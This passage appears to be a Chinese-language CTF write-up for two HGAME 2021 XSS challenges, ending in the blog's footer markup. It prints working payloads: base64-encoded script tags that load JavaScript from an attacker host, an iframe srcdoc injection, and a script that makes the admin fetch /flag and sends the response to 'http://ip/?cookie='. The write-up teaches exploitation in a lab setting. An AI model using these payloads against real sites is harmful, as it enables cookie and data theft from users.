+<p>不过我们可以添加<code>&lt;iframe scr=&quot;/preview &quot;&gt;</code>来使得index能直接看到<code>/preview</code>页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124755.png" alt="image-20210216124754639"  /></p>
+<p>再通过字符串替换功能，把<code>xxx</code>换成<code>javascript:xxxxx</code>，形成<code>&lt;iframe src='javascript:alter(1)'&gt;</code>即可XSS</p>
+<p>payload：</p>
+<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">javascript</span><span class="o">:</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+&#39;</span><span class="p">));</span>
+</code></pre></div><p>小手一抖，cookie到手：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124700.png" alt="image-20210216124651414"  /></p>
+<p>hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function}</p>
+<h3 id="post-to-zuckonit-another-version">Post to zuckonit another version</h3>
+<p>考点：XSS，HttpOnly绕过</p>
+<p>说是绕<code>HttpOnly</code>，实则并没有绕；</p>
+<p>相比于上一道XSS：</p>
+<ol>
+<li>
+<p>增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173620.png" alt="image-20210220173619352"  /></p>
+</li>
+<li>
+<p>修改了功能，把直接替换字符串换成了查找字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173858.png" alt="image-20210220173856459"  /></p>
+</li>
+</ol>
+<p>依然在<code>static/www.zip</code>给出了源码：<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip"  target="_blank" rel="noopener"
+    >source.zip</a></p>
+<p>源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加<code>&lt;b&gt;</code>标签，得到高亮效果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174349.png" alt="image-20210220174348492"  /></p>
+<p>如果按照正常思维来查找&rsquo;a&rsquo;字符串的话，效果就如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174512.png" alt="image-20210220174510622"  /></p>
+<p>但是我们应当注意到，这个高亮实际上还是由<code>String.prototype.replace()</code>方法来进行<strong>正则替换</strong>的，那么我们如果输入<code>.*</code>之类的关键词进行高亮就会出现意想不到的效果：
+<img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220174753.png" alt="image-20210220174752450"  /></p>
+<p>没错，因为正则替换让我们得以有机可乘</p>
+<p>思路还是一样，先利用替换构造好XSS，再利用<code>&lt;iframe src='/preview'&gt;</code>来触发0-click</p>
+<p>payload：</p>
+<pre><code>&lt;iframe src='/preview'&gt;
+&lt;iframe src='AAA' &gt;
+</code></pre><p>替换的payload：</p>
+<pre><code>AAA('srcdoc='&amp;lt;img src=1 onerror=document.write(atob(&amp;#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==&amp;#x27;));&amp;gt;')*
+</code></pre><p>替换之后其实是这样：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175915.png" alt="image-20210220175913943"  /></p>
+<p>实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过</p>
+<pre><code>&lt;iframe src=&quot;&lt;b class=&amp;quot;search_result&amp;quot;&gt;AAA(&quot; srcdoc=&quot;&lt;img src=1 onerror=document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg=='));&gt;&quot; )*&lt;=&quot;&quot; b=&quot;&quot;&gt;' &gt;&lt;/iframe&gt;
+</code></pre><p>结果一目了然；</p>
+<p>而iframe里面<code>&lt;script&gt;</code>指向的JS：</p>
+<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="c1">//是否能跨域
+</span><span class="c1"></span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;http://ip/?cookie=&#39;</span> <span class="o">+</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">)</span>
+        <span class="c1">//得用btoa()进行base64编码，不然flag会很神必
+</span><span class="c1"></span>        <span class="c1">//尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用
+</span><span class="c1"></span>    <span class="p">}</span>
+<span class="p">};</span>
+<span class="c1">//设置连接信息
+</span><span class="c1">//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post
+</span><span class="c1">//第二个参数表示请求的url地址，get方式请求的参数也在url中
+</span><span class="c1">//第三个参数表示采用异步还是同步方式交互，true表示异步
+</span><span class="c1"></span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="c1">//4.发送数据，开始和服务器端进行交互
+</span><span class="c1">//同步方式下，send这句话会在服务器段数据回来后才执行完
+</span><span class="c1">//异步方式下，send这句话会立即完成执行
+</span><span class="c1"></span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</code></pre></div><p>不能绕HttpOnly来获取cookie，但是我们可以直接让admin请求<code>/flag</code>，把responseText发给我们就行了；</p>
+<p>这个是本地打的结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220172735.png" alt="image-20210220172727362"  /></p>
+<p>大手一抖，flag到手：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175431.png" alt="image-20210220175430475"  /></p>
+<p>因为flag里面出题人故意放了<code>&amp;</code>字符让我们踩坑，打出来的responseText需要base64编码。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175441.png" alt="image-20210220172930232"  /></p>
+<p>下面这个才对。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220175445.png" alt="image-20210220173313149"  /></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
